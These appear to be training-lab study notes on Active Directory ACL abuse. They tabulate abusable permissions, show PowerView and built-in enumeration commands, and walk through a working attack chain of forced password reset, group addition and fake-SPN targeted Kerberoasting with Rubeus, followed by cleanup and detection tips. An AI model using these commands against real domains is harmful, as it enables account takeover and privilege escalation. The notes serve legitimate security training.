# ACL Abuse Attacks

## Overview
- Access Control Lists (ACLs) define who has access to which asset/resource and the level of access
- ACEs (Access Control Entries) map back to a user, group, or process and define the rights granted
- Two types: DACL (Discretionary - who can access) and SACL (System - audit logging)
- ACL misconfigurations are a serious threat and cannot be detected by vulnerability scanners

## Abusable ACE Permissions

| Permission | Abuse Method |
|---|---|
| ForceChangePassword | `Set-DomainUserPassword` |
| GenericAll | `Set-DomainUserPassword` or `Add-DomainGroupMember` |
| GenericWrite | `Set-DomainObject` (set SPN for targeted Kerberoasting) |
| WriteOwner | `Set-DomainObjectOwner` |
| WriteDACL | `Add-DomainObjectACL` |
| AllExtendedRights | `Set-DomainUserPassword` or `Add-DomainGroupMember` |
| AddSelf | `Add-DomainGroupMember` |

## Enumerating ACLs with PowerView

### Find all objects a user has rights over
```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

### Using built-in tools (no PowerView)
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

### Reverse search GUID to human-readable
```powershell
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
```

## Enumerating ACLs with BloodHound
- Set user as starting node > Node Info > Outbound Control Rights
- First Degree Object Control shows direct rights
- Transitive Object Control shows full attack paths
- Right-click edges for help on abuse methods
- Use pre-built queries: "Find Principals with DCSync Rights", "Shortest Paths to Domain Admins"

## Attack Chain Example

### 1. ForceChangePassword
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

### 2. GenericWrite - Add user to group
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

### 3. GenericAll - Targeted Kerberoasting (set fake SPN)
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

## Cleanup
```powershell
# Remove fake SPN (do this FIRST)
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Remove user from group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

# Reset password back to original if known
```

## Detection
- Enable Advanced Security Audit Policy
- Monitor Event ID 5136: A directory service object was modified
- Monitor group membership changes
- Regular AD audits with BloodHound
